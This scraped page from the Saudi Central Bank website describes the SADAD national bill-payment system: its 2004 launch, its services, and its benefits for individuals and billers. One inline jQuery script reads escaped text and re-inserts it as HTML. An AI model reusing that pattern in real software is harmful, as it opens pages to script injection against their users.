	<li class="ms-breadcrumbRootNode"><span class="s4-breadcrumb-arrowcont"><span style="height:16px;width:16px;position:relative;display:inline-block;overflow:hidden;" class="s4-clust s4-breadcrumb"><img src="" alt="" style="position:absolute;left:-217px !important;top:-210px !important;"></span></span><a title="Saudi Central Bank" class="ms-breadcrumbRootNode" href="/ar-sa/Pages/default.aspx">Saudi Central Bank</a><ul class="ms-breadcrumbRootNode"><li class="breadcrumb-item"><span class="s4-breadcrumb-arrowcont"><span style="height:16px;width:16px;position:relative;display:inline-block;overflow:hidden;" class="s4-clust s4-breadcrumb"><img src="" alt="" style="position:absolute;left:-217px !important;top:-210px !important;"></span></span><a title="The Saudi Central Bank (SAMA) aims to maintain monetary stability, support the financial sector's stability and promote trust therein, as well as Support economic growth" class="breadcrumb-item" href="/en-US/Pages/default.aspx">Saudi Central Bank</a><ul class="breadcrumb-item"><li class="breadcrumb-item"><span class="s4-breadcrumb-arrowcont"><span style="height:16px;width:16px;position:relative;display:inline-block;overflow:hidden;" class="s4-clust s4-breadcrumb"><img src="" alt="" style="position:absolute;left:-217px !important;top:-210px !important;"></span></span><a class="breadcrumb-item" href="/en-US/payment/Pages/default.aspx">National Payment Systems</a><ul class="breadcrumb-item"><li class="breadcrumb-item active"><span class="s4-breadcrumb-arrowcont"><span style="height:16px;width:16px;position:relative;display:inline-block;overflow:hidden;" class="s4-clust s4-breadcrumb"><img src="" alt="" style="position:absolute;left:-217px !important;top:-210px !important;"></span></span><a class="breadcrumb-item active" href="/en-us/payment/pages/sadad.aspx">SADAD</a></li></ul></li></ul></li></ul></li>
</ul>
		                        </nav>
		                        <h1 class="page-title">
		                            SADAD
		                        </h1>
	                        </div>
	                        <div class="col-12 col-lg-3">
	                            <div class="page-content-actions">
	                               <a href="javascript:AddToFavorites();" class="page-content-actions__btn" id="btn_fav">
	                                    <svg xmlns="http://www.w3.org/2000/svg" width="19" height="18" viewBox="0 0 19 18" fill="none">
	                                        <path d="M8.07715 1.1543C8.57699 0.207327 9.93362 0.20747 10.4336 1.1543L12.4297 4.9375C12.4938 5.05896 12.6107 5.14357 12.7461 5.16699L16.96 5.89648C18.0154 6.0791 18.435 7.36959 17.6885 8.1377L14.708 11.2041C14.6123 11.3026 14.5674 11.4402 14.5869 11.5762L15.1953 15.8096C15.3478 16.8698 14.2503 17.667 13.2891 17.1943L9.45117 15.3076C9.32797 15.2471 9.18379 15.2472 9.06055 15.3076L5.22168 17.1943C4.26053 17.6667 3.16297 16.8697 3.31543 15.8096L3.9248 11.5762C3.94427 11.4402 3.89943 11.3026 3.80371 11.2041L0.823242 8.1377C0.0767956 7.36967 0.495577 6.0793 1.55078 5.89648L5.76562 5.16699C5.90088 5.14346 6.01796 5.05894 6.08203 4.9375L8.07715 1.1543Z" stroke="white" stroke-width="0.888889"></path>
	                                    </svg>
	                                </a>
	                                <div class="dropdown">
	                                    <a href="#" class="page-content-actions__btn dropdown-toggle" role="button" data-bs-toggle="dropdown" aria-expanded="false">
	                                        <img src="/_layouts/15/SAMA.Portal/assets/images/actions/share.svg" alt="Share">
	                                    </a>
	                                    <ul class="dropdown-menu dropdown-menu-end" data-popper-placement="bottom-end">
	                                        <li>
	                                            <a target="_blank" class="dropdown-item" href="mailto:?subject=SADAD&amp;body=SADAD%0Ahttps://www.sama.gov.sa/en-us/payment/pages/sadad.aspx" id="btn_mailto">
	                                                <img src="/_layouts/15/SAMA.Portal/assets/images/email-icon.svg" alt="Share via Email" class="dropdown-item-icon">
	                                                <span>Share via Email</span>
	                                            </a>
	                                        </li>
	                                        <li>
	                                            <a target="_blank" class="dropdown-item" href="https://www.facebook.com/sharer.php?u=https://www.sama.gov.sa/en-us/payment/pages/sadad.aspx" id="btn_facebook">
	                                                <img src="/_layouts/15/SAMA.Portal/assets/images/social/facebook-colored.svg" alt="Share on Facebook" class="dropdown-item-icon">
	                                                <span>Share on Facebook</span>
	                                            </a>
	                                        </li>
	                                        <li>
	                                            <a target="_blank" class="dropdown-item" href="https://twitter.com/share?url=https://www.sama.gov.sa/en-us/payment/pages/sadad.aspx&amp;amp;text=SADAD" id="btn_x">
	                                                <img src="/_layouts/15/SAMA.Portal/assets/images/social/x-colored.svg" alt="Share on X" class="dropdown-item-icon">
	                                                <span>Share on X</span>
	                                            </a>
	                                        </li>
	                                        <li>
	                                            <a target="_blank" class="dropdown-item" href="https://www.linkedin.com/shareArticle?mini=true&amp;amp;url=https://www.sama.gov.sa/en-us/payment/pages/sadad.aspx" id="btn_linkedin">
	                                                <img src="/_layouts/15/SAMA.Portal/assets/images/social/linkedin-colored.svg" alt="Share on LinkedIn" class="dropdown-item-icon">
	                                                <span>Share on LinkedIn</span>
	                                            </a>
	                                        </li>
	                                        <!-- <li>
	                                            <a class="dropdown-item" href="#" id="btn_copy">
	                                                <img src="/_layouts/15/SAMA.Portal/assets/images/copy-icon.svg" alt="" class="dropdown-item-icon">
	                                                <span></span>
	                                            </a>
	                                        </li> -->
	                                    </ul>
	                                </div>
	                                <a href="javascript:window.print();" class="page-content-actions__btn">
	                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 18 18" fill="none">
	                                        <path d="M14.9844 11.9688H13.5156V17.5938H4.07812V11.9688H2.60938V10.9688H14.9844V11.9688ZM5.07812 16.5938H12.5156V11.9688H5.07812V16.5938ZM15.6875 5.34375C16.7403 5.34375 17.5938 6.19723 17.5938 7.25V12.875C17.5938 13.9278 16.7403 14.7812 15.6875 14.7812H14.9844V13.7812H15.6875C16.188 13.7812 16.5938 13.3755 16.5938 12.875V7.25C16.5938 6.7495 16.188 6.34375 15.6875 6.34375H1.90625C1.40576 6.34375 1 6.74951 1 7.25V12.875C1 13.3755 1.40576 13.7812 1.90625 13.7812H2.60938V14.7812H1.90625C0.853471 14.7812 0 13.9278 0 12.875V7.25C0 6.19722 0.853471 5.34375 1.90625 5.34375H15.6875ZM10.9062 14.7812H6.6875V13.7812H10.9062V14.7812ZM11.6094 7.95312C11.9977 7.95313 12.3125 8.26791 12.3125 8.65625C12.3125 9.04459 11.9977 9.35937 11.6094 9.35938C11.2211 9.35938 10.9062 9.04459 10.9062 8.65625C10.9063 8.26791 11.2211 7.95312 11.6094 7.95312ZM14.4219 7.95312C14.8102 7.95313 15.125 8.26791 15.125 8.65625C15.125 9.04459 14.8102 9.35937 14.4219 9.35938C14.0336 9.35938 13.7188 9.04459 13.7188 8.65625C13.7188 8.26791 14.0336 7.95312 14.4219 7.95312ZM13.5156 0V4.01562H12.5156V1H5.07812V4.01562H4.07812V0H13.5156Z" fill="white"></path>
	                                    </svg>
	                                </a>
	                            </div>
	                        </div>
	                    </div>
                    </div>
                </div>
            </section>
            <section class="inner-page__content">
                <div id="DeltaPlaceHolderMain">
	
                    <div id="pageStatusBar" class="ms-status-blue" style="display: none;"></div>
                    
<div class="esal-page">
                <div class="container-fluid">
                    <div class="row g-3 g-xl-5">
                        <div class="col-12 col-xl-3">
                            <div class="page-content-menu">
                                <div class="page-content-menu__list nav nav-pills flex-column w-100" id="esalTabs" role="tablist">
                                    <button class="content-link nav-link active" id="overview-tab" data-bs-toggle="pill" data-bs-target="#overview-pane" type="button" role="tab" aria-controls="overview-pane" aria-selected="true">
                                        
			                                    About
			                                
			                            
                                    </button>
                                    <button class="content-link nav-link" id="esal-services-tab" data-bs-toggle="pill" data-bs-target="#esal-services-pane" type="button" role="tab" aria-controls="esal-services-pane" aria-selected="false" tabindex="-1">
                                        
			                                     Services
			                                
			                                                                    
                                    </button>
                                    <button class="content-link nav-link" id="esal-advantages-tab" data-bs-toggle="pill" data-bs-target="#esal-advantages-pane" type="button" role="tab" aria-controls="esal-advantages-pane" aria-selected="false" tabindex="-1">
                                        
			                                     Benefits 
			                                
			                            
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 col-xl-9">
                            <div class="tab-content" id="esalTabContent">
                                <div class="tab-pane fade show active" id="overview-pane" role="tabpanel" aria-labelledby="overview-tab">
                                    <div id="ctl00_PlaceHolderMain_ctl06_label" style="display:none">Page Content</div><div id="ctl00_PlaceHolderMain_ctl06__ControlWrapper_RichHtmlField" class="ms-rtestate-field" style="display:inline" aria-labelledby="ctl00_PlaceHolderMain_ctl06_label"><div class="payment-system-card"><div class="payment-system-card__header"><h3 class="system-title">​​​​​​​SADAD<br></h3></div><div class="payment-system-card__body"><div class="row g-5"><div class="col-12 col-lg-8"><p class="system-description">​​ The SADAD system is one of the national payment systems owned by the Saudi Central Bank (SAMA), which was launched in 2004. The system enables the display and payment of invoices electronically, such as government service invoices or other services, with high flexibility through all banking channels and licensed digital wallets.​<br></p><p class="system-description">​​ SADAD connects billers (invoice-issuing entities) with banking and non-banking entities. They benefit from SADAD services through the facilitated process of reviewing and paying invoices electronically by their consumers as individuals, establishments, or government agencies. ​​<br></p></div><div class="col-12 col-lg-4"><div class="system-image"> 
               <img src="/ar-sa/payment/PublishingImages/sadad-logo.svg" alt="sadad">
               </div>
               <br></div><div class="col-12"><p class="system-description"> The system enables fast and accurate payments through various channels, such as ATMs, internet banking, telephone banking, and banking applications. It enables beneficiaries to easily pay their invoices with the highest security standards.</p></div></div></div></div>​</div>
                                </div>
                                <div class="tab-pane fade" id="esal-services-pane" role="tabpanel" aria-labelledby="esal-services-tab">
	                                
	                                <div class="edit-mode-panel roll-up">
		
	                                	<div class="customHtmlField">
	                                		<div class="row g-3"><div class="col-12 aos-init aos-animate" data-aos="fade-up"><div class="list-icon-card light-card"><div class="card-icon">
            <br>
         </div><div class="card-content"><h6 class="card-title">Submitting and paying invoices electronically through the available banking channels.</h6></div></div></div><div class="col-12 aos-init aos-animate" data-aos="fade-up" data-aos-delay="100"><div class="list-icon-card light-card"><div class="card-icon"></div><div class="card-content"><h6 class="card-title">Processing refunds for invoices paid through SADAD​. </h6></div></div></div><div class="col-12 aos-init aos-animate" data-aos="fade-up" data-aos-delay="200"><div class="list-icon-card light-card"><div class="card-icon"></div><div class="card-content"><h6 class="card-title"> Receiving automatic payment notification via SADAD.</h6></div></div></div><div class="col-12 aos-init aos-animate" data-aos="fade-up" data-aos-delay="100"><div class="list-icon-card light-card"><div class="card-icon"></div><div class="card-content"><h6 class="card-title">Issuing periodic reports for billers and banks on reconciled and settled payment transactions. </h6></div></div></div><div class="col-12 aos-init aos-animate" data-aos="fade-up" data-aos-delay="100"><div class="list-icon-card light-card"><div class="card-icon"></div><div class="card-content"><h6 class="card-title"> Providing an electronic portal for banks and billers that enables them to know and follow up on all the details of the transactions related to SADAD, and allows them to send complaints or inquiries.  </h6></div></div></div><div class="col-12 aos-init aos-animate" data-aos="fade-up" data-aos-delay="100"><div class="list-icon-card light-card"><div class="card-icon">
         ​<span id="ms-rterangecursor-start" rtenodeid="1"></span><span id="ms-rterangecursor-end"></span><br></div><div class="card-content"><h6 class="card-title"> Updating the status of invoices paid through SADAD. </h6></div></div></div></div>
	                                	</div>
	                                
	</div>
                                </div>
                                <div class="tab-pane fade" id="esal-advantages-pane" role="tabpanel" aria-labelledby="esal-advantages-tab">
                                	
	                                <div class="edit-mode-panel roll-up">
		
	                                	<div class="customHtmlField">
	                                		<div class="payment-system-card"><div class="payment-system-card__header"><h3 class="title">For ​Individuals<br></h3></div><div class="payment-system-card__body"><div class="row g-3"><div class="col-12 aos-init aos-animate" data-aos="fade-up"><div class="list-icon-card light-card"><div class="card-icon">&nbsp;</div><div class="card-content"><h6 class="card-title"> Fast electronic bill payment through banking channels and licensed digital wallets without the need to visit branches. </h6></div></div></div><div class="col-12 aos-init aos-animate" data-aos="fade-up" data-aos-delay="100"><div class="list-icon-card light-card"><div class="card-icon">&nbsp;<br></div><div class="card-content"><h6 class="card-title">
     Ease of viewing and paying bills through the use of various channels, such as ATMs, points of sale, and banking applications.
                  </h6></div></div></div><div class="col-12 aos-init aos-animate" data-aos="fade-up" data-aos-delay="200"><div class="list-icon-card light-card"><div class="card-icon">&nbsp;</div><div class="card-content"><h6 class="card-title"> Better organization of payments by viewing and keeping an invoice record in one place. </h6></div></div></div></div><h3 class="title mt-4 mb-2">For billers (invoice-issuing entities) and SADAD intermediaries</h3><div class="row g-3"><div class="col-12 aos-init aos-animate" data-aos="fade-up"><div class="list-icon-card light-card"><div class="card-icon">&nbsp;</div><div class="card-content"><h6 class="card-title"> Increasing the quality of customer experience by providing them with accurate and real-time invoicing information.</h6></div></div></div><div class="col-12 aos-init aos-animate" data-aos="fade-up"><div class="list-icon-card light-card"><div class="card-icon">&nbsp;</div><div class="card-content"><h6 class="card-title">Enhancing the transparency and trust with customers through clear and complete data.</h6></div></div></div><div class="col-12 aos-init aos-animate" data-aos="fade-up"><div class="list-icon-card light-card"><div class="card-icon">&nbsp;</div><div class="card-content"><h6 class="card-title"> Providing electronic invoice review and payment services to sub-billers affiliated with SADAD intermediaries. </h6></div></div></div><div class="col-12 aos-init aos-animate" data-aos="fade-up" data-aos-delay="100"><div class="list-icon-card light-card"><div class="card-icon">&nbsp;</div><div class="card-content"><h6 class="card-title"> Achievin​g greater efficiency by reducing operational costs and accelerating collection for billers. </h6></div></div></div></div></div></div>​<br>
	                                	</div>
	                                
	</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
    <script type="text/javascript">
		$('.customHtmlField').each(function(){
			let raw = $(this).text();
			$(this).html(raw);
		});
	</script>
<div style="display:none" id="hidZone"><menu class="ms-hide">
		<ie:menuitem id="MSOMenu_Help" iconsrc="/_layouts/15/images/HelpIcon.gif" onmenuclick="MSOWebPartPage_SetNewWindowLocation(MenuWebPart.getAttribute('helpLink'), MenuWebPart.getAttribute('helpMode'))" text="Help" type="option" style="display:none">

		</ie:menuitem>
	</menu></div>
                
</div>
            </section>
        </main>     
     <!--Footer-->
     <footer class="footer">
        <div class="footer-top">
           <div class="container-fluid">
              <div class="row g-5">
                 <div class="col-12 col-md-6 col-xl-3 aos-init" data-aos="fade-up">
                    
                            <a href="/en-us" class="footer-logo" title="Home">
                                <img src="/_layouts/15/SAMA.Portal/assets/images/white-lg-logo.svg" alt="logo">
                            </a>
                        
                    
                 </div>
                 <div class="col-12 col-md-6 col-xl-6">
                    <div class="row g-5 footer-columns-lists"><div class="col-12 col-md-6 col-xl-6 aos-init" data-aos="fade-up" data-aos-delay="200">
										<div class="footer-list">
											<h6 class="footer-list__title" data-id="1">Important Links</h6>
											<ul class="list-links"><li><a title="About the Saudi Central Bank" href="/en-us/About/Pages/Overview.aspx" class="item-link">About the Saudi Central Bank</a></li><li><a title="Media Center" href="/en-US/MediaCenter/Pages/default.aspx" class="item-link">Media Center</a></li><li><a title="E-Services" href="/en-US/Pages/LandingServices.aspx" class="item-link">E-Services</a></li><li><a title="Open Data Platform" href="/en-US/Statistics/Pages/Summary.aspx" class="item-link">Open Data Platform</a></li><li><a title="Careers" href="http://careers.sama.gov.sa/ar/" class="item-link">Careers</a></li></ul></div></div><div class="col-12 col-md-6 col-xl-6 aos-init" data-aos="fade-up" data-aos-delay="200">
										<div class="footer-list">
											<h6 class="footer-list__title" data-id="4">Help &amp; Support</h6>
											<ul class="list-links"><li><a title="Privacy Policy" href="/en-us/pages/privacy_policy.aspx" class="item-link">Privacy Policy</a></li><li><a title="Terms &amp; Conditions" href="/en-us/pages/termsofuse.aspx" class="item-link">Terms &amp; Conditions</a></li><li><a title="Sitemap" href="/en-us/PortalServices/Pages/sitemap.aspx" class="item-link">Sitemap</a></li><li><a title="Complaints" href="/en-US/PortalServices/Pages/contactus.aspx?displaycomplaints=true" class="item-link">Complaints</a></li><li><a title="Contact Us" href="/en-US/PortalServices/Pages/contactus.aspx" class="item-link">Contact Us</a></li></ul></div></div></div>
                 </div>
                 <div class="col-12 col-md-6 col-xl-3 aos-init" data-aos="fade-up" data-aos-delay="300">
                    <div class="footer-list border-0 social-contact-lists"><h6 class="footer-list__title" data-id="3">Address &amp; Contact</h6><ul class="list-links"><li>
												<a href="/en-us/PortalServices/Pages/contactus.aspx?displaybranches=true" title="Kingdom of Saudi Arabia - Riyadh" class="item-link">
													<span class="icon"><img src="/ar-sa/PublishingImages/A%26C/location.svg" alt="Kingdom of Saudi Arabia - Riyadh"></span>
													Kingdom of Saudi Arabia - Riyadh
												</a>
											</li><li>
												<a href="/en-us/PortalServices/Pages/contactus.aspx?displaybranches=true" title="+966 11 463 3000" class="item-link">
													<span class="icon"><img src="/ar-sa/PublishingImages/A%26C/tel.svg" alt="+966 11 463 3000"></span>
													+966 11 463 3000
												</a>
											</li><li>
												<a href="/en-us/PortalServices/Pages/contactus.aspx?displaybranches=true" title="+966 11 466 2936 / 466-2966" class="item-link">
													<span class="icon"><img src="/ar-sa/PublishingImages/A%26C/fax.svg" alt="+966 11 466 2936 / 466-2966"></span>
													+966 11 466 2936 / 466-2966
												</a>
											</li><li>
												<a href="/en-us/PortalServices/Pages/contactus.aspx?displaybranches=true" title="Branches" class="item-link">
													<span class="icon"><img src="/ar-sa/PublishingImages/A%26C/branch.svg" alt="Branches"></span>
													Branches
												</a>
											</li></ul><h6 class="footer-list__title" data-id="2">Follow us on</h6><div class="social-list"><a href="https://x.com/SAMA_GOV" target="_blank" data-bs-toggle="tooltip" data-bs-placement="top" data-bs-custom-class="primary-tooltip" data-bs-title="x">
												<img src="/ar-sa/PublishingImages/SL/x.svg" alt="x">
											</a><a href="https://www.facebook.com/SAMAGOV0" target="_blank" data-bs-toggle="tooltip" data-bs-placement="top" data-bs-custom-class="primary-tooltip" data-bs-title="facebook">
												<img src="/ar-sa/PublishingImages/SL/facebook.svg" alt="facebook">
											</a><a href="https://www.linkedin.com/company/saudi-central-bank-sama" target="_blank" data-bs-toggle="tooltip" data-bs-placement="top" data-bs-custom-class="primary-tooltip" data-bs-title="linkedin">
												<img src="/ar-sa/PublishingImages/SL/linkedin.svg" alt="linkedin">
											</a><a href="https://www.youtube.com/@SAMAGOV0" target="_blank" data-bs-toggle="tooltip" data-bs-placement="top" data-bs-custom-class="primary-tooltip" data-bs-title="youtube">
												<img src="/ar-sa/PublishingImages/SL/youtube.svg" alt="youtube">
											</a><a href="https://www.instagram.com/sama_gov/" target="_blank" data-bs-toggle="tooltip" data-bs-placement="top" data-bs-custom-class="primary-tooltip" data-bs-title="Instagram">
												<img src="/ar-sa/PublishingImages/SL/instagram.svg" alt="Instagram">
											</a></div></div>
                 </div>
              </div>
           </div>
        </div>
        <div class="container-fluid">
           <div class="footer-bottom">
                <p class="copyrights">© 2026 Saudi Central Bank (SAMA). All rights reserved.</p>
                
                
                        <a href="#!" title="Back to top" class="back-top-btn">
                            Back to top
                            <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M0.178969 5.03208C-0.0596564 4.79345 -0.0596564 4.40586 0.178969 4.16723L4.06798 0.279021C4.3066 0.0403957 4.6934 0.0403957 4.93202 0.279021L8.82103 4.16723C9.05966 4.40586 9.05966 4.79345 8.82103 5.03208C8.58241 5.2707 8.19481 5.2707 7.95619 5.03208L5.11104 2.18613V15.376H3.88896V2.18613L1.04381 5.03208C0.805186 5.2707 0.417595 5.2707 0.178969 5.03208Z" fill="white"></path>
                            </svg>
                        </a>
                    
           </div>
        </div>
     </footer>
     <!-- Aside links -->
     <div class="home-aside-links">
        <div class="aside-links-main">
           <ul class="list-unstyled">
              <li>
                 <button type="button" class="item-link" title="" data-bs-toggle="offcanvas" data-bs-target="#surveyOffcanvas" aria-controls="surveyOffcanvas">
                        <span class="icon">
                           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                              <path d="M21.1875 5.4375C22.6373 5.4375 23.8125 6.61278 23.8125 8.0625V18.8438C23.8125 20.2935 22.6373 21.4687 21.1875 21.4688H15.7324L12.1348 23.1777L11.0625 23.6865V21.4688H9.9375C8.48771 21.4688 7.3125 20.2935 7.3125 18.8438V18.0938H8.8125V18.8438C8.8125 19.4651 9.31616 19.9688 9.9375 19.9688H12.5625V21.3135L15.2402 20.041L15.3936 19.9688H21.1875C21.8088 19.9687 22.3125 19.4651 22.3125 18.8438V8.0625C22.3125 7.44119 21.8088 6.9375 21.1875 6.9375H18.5625V5.4375H21.1875ZM14.0625 0.1875C15.5123 0.187501 16.6875 1.36278 16.6875 2.8125V14.0625C16.6875 15.5122 15.5123 16.6875 14.0625 16.6875H8.61426L5.02246 18.4834L3.9375 19.0264V16.6875H2.8125C1.36271 16.6875 0.1875 15.5122 0.1875 14.0625V2.8125C0.1875 1.36278 1.36271 0.1875 2.8125 0.1875H14.0625ZM2.8125 1.6875C2.19116 1.6875 1.6875 2.19119 1.6875 2.8125V14.0625C1.6875 14.6838 2.19116 15.1875 2.8125 15.1875H5.4375V16.5996L8.10254 15.2666L8.26074 15.1875H14.0625C14.6838 15.1875 15.1875 14.6838 15.1875 14.0625V2.8125C15.1875 2.19119 14.6838 1.6875 14.0625 1.6875H2.8125ZM9.1875 13.125H7.6875V11.25H9.1875V13.125ZM8.4375 3.9375C9.88721 3.9375 11.0624 5.1129 11.0625 6.5625C11.0624 7.57256 10.4911 8.44837 9.6582 8.88672C9.39184 9.0271 9.18758 9.37074 9.1875 9.20078H7.6875C7.68758 8.94854 8.09144 8.01555 8.95996 7.55859C9.31957 7.36929 9.56244 6.99379 9.5625 6.5625C9.56237 5.9413 9.05876 5.4375 8.4375 5.4375C7.81624 5.4375 7.31263 5.9413 7.3125 6.5625H5.8125C5.81263 5.1129 6.98779 3.9375 8.4375 3.9375Z" fill="#002717"></path>
                           </svg>
                        </span>
                        <span class="title font-bold">
                        Public opinion poll
                        
                    </span>
                </button>              
              </li>
              <li>
                 <button type="button" class="item-link primary" data-bs-toggle="offcanvas" data-bs-target="#accessibilityOffcanvas" aria-controls="accessibilityOffcanvas">
                    <span class="icon">
                       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="28" viewBox="0 0 24 28" fill="none">
                          <path d="M1.88672 7.36035C2.46992 6.1945 3.86114 5.71846 5.03516 6.30469L10.9414 9.25H13.0361L18.9424 6.30469L19.1006 6.22559H19.1592C20.2018 5.81817 21.3965 6.2081 22.002 7.14844L22.1211 7.35547L22.127 7.36621C22.6917 8.51963 22.2206 9.92262 21.0742 10.5078L21.0674 10.5117V10.5107L15.9629 13.0566V18.0449L18.8604 23.251H18.8594C19.4985 24.3902 19.0658 25.8167 17.9482 26.4453C17.5797 26.6526 17.1972 26.75 16.7969 26.75C15.9847 26.75 15.1787 26.3313 14.749 25.5479L12.0049 20.6113L9.26074 25.5488L9.25879 25.5518C8.83527 26.3047 8.03834 26.75 7.21289 26.75C6.83264 26.75 6.43312 26.6613 6.06738 26.4482V26.4492C6.06547 26.4482 6.06343 26.4464 6.06152 26.4453C6.05551 26.4418 6.04896 26.4391 6.04297 26.4355V26.4336C4.91342 25.7938 4.52024 24.3731 5.14941 23.251L8.04688 18.0449V13.0566L2.94238 10.5107H2.94141C1.77773 9.9288 1.29774 8.52151 1.88672 7.36035ZM11.9971 1.25C14.1712 1.25005 15.9473 3.02601 15.9473 5.2002C15.9472 7.37429 14.1712 9.15034 11.9971 9.15039C9.82292 9.15039 8.04698 7.37432 8.04688 5.2002C8.04688 3.02598 9.82286 1.25 11.9971 1.25Z" stroke="white" stroke-width="1.5"></path>
                       </svg>
                    </span>
                    <span class="title font-bold">
                        Accessibility tools
                        
                    </span>
                 </button>
              </li>
           </ul>
        </div>
     </div>
     <!-- Simple Loader -->
     <div id="preloader" style="display: none;">
        <div class="preloader-content">
           <div class="logo">
              <img src="/_layouts/15/SAMA.Portal/assets/images/logo.svg" alt="SAMA">
           </div>
           <h5>
                Loading...
                
            </h5>
           <div class="loading-spinner">
              <div class="spinner-circle"></div>
           </div>
        </div>
     </div>
     <!-- Mobile Offcanvas Menu -->
     <div class="offcanvas offcanvas-start mobile-menu-offcanvas " tabindex="-1" id="mobileMenu" aria-labelledby="mobileMenuLabel">
        <div class="offcanvas-header">
           <div class="offcanvas-logo">
              <img src="/_layouts/15/SAMA.Portal/assets/images/logo.svg" alt="logo">
           </div>
           <div class="actions-btns">
              <div class="actions-btns__item d-flex d-sm-none">
                 <a href="#" class="actions-btn search-btn" data-bs-toggle="modal" data-bs-target="#searchModal" data-bs-custom-class="tooltip-modal" data-bs-placement="bottom" title="Search">
                 </a>
              </div>
              <div class="actions-btns__item d-flex d-sm-none">
                 <a href="https://www.sama.gov.sa/ar-sa/payment/pages/sadad.aspx" class="actions-btn lang-btn" data-bs-toggle="tooltip" data-bs-placement="bottom" aria-label="Arabic" data-bs-original-title="Arabic">
                 </a>
              </div>
              <div class="actions-btns__item">
                 <button type="button" class="actions-btn btn-close" data-bs-dismiss="offcanvas" aria-label="Close" data-bs-toggle="tooltip" data-bs-placement="bottom" data-bs-original-title="Close"></button>
              </div>
           </div>
        </div>
        <div class="offcanvas-body">
           <nav class="mobile-nav">
              <ul class="mobile-nav-list"><li class="mobile-nav-item">
                                    <a class="mobile-nav-link" href="https://www.sama.gov.sa/en-US" title="Home">Home</a>
                                </li><li class="mobile-nav-item has-submenu">
                                        <div class="mobile-nav-header">
                                            <a class="mobile-nav-link" href="https://www.sama.gov.sa/en-US/About/Pages/default.aspx" title="About SAMA">About SAMA</a>
                                            <button class="mobile-submenu-toggle" type="button">
                                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                                                    <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                </svg>
                                            </button>
                                        </div>
                                        <ul class="mobile-submenu mobile-mega-menu"><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">About us</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Overview.aspx">Overview</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/SAMAHistory.aspx">Our History</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/bank-law.aspx">Saudi Central Bank Law</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/SAMAFunction.aspx">Saudi Central Bank Functions</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Strategy.aspx">Saudi Central Bank Strategy</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Organization_Structure.aspx">Organizational Structure</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Saudi Central Bank Management</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/boardOfDirectors.aspx">Members of the Board of Directors of the Saudi Central Bank</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/LeaderShips/Pages/default.aspx">Saudi Central Bank Leadership</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Other</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Relations_with_regional_and_international_organizations.aspx">International Relations</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Memorandums_of_understanding-.aspx">Memoranda of Understanding</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Links.aspx">Relevant Links</a></li></ul></li></ul></li><li class="mobile-nav-item has-submenu">
                                        <div class="mobile-nav-header">
                                            <a class="mobile-nav-link" href="https://www.sama.gov.sa/en-US/MediaCenter/Pages/Default.aspx" title="Media Center">Media Center</a>
                                            <button class="mobile-submenu-toggle" type="button">
                                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                                                    <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                </svg>
                                            </button>
                                        </div>
                                        <ul class="mobile-submenu mobile-mega-menu"><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">News</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/MediaCenter/News/Pages/allnews.aspx">News</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/MediaCenter/News/Pages/speeches.aspx">Speeches</a></li></ul></li><li class="mobile-mega-menu__section"><a class="mobile-mega-menu__title" href="https://www.sama.gov.sa/en-US/MediaCenter/Pages/BrandGuidelines.aspx">SAMA Brand Identity Guidelines​​</a></li></ul></li><li class="mobile-nav-item has-submenu">
                                        <div class="mobile-nav-header">
                                            <a class="mobile-nav-link" href="https://www.sama.gov.sa/en-US/Supervision/Pages/default.aspx" title="Supervision">Supervision</a>
                                            <button class="mobile-submenu-toggle" type="button">
                                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                                                    <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                </svg>
                                            </button>
                                        </div>
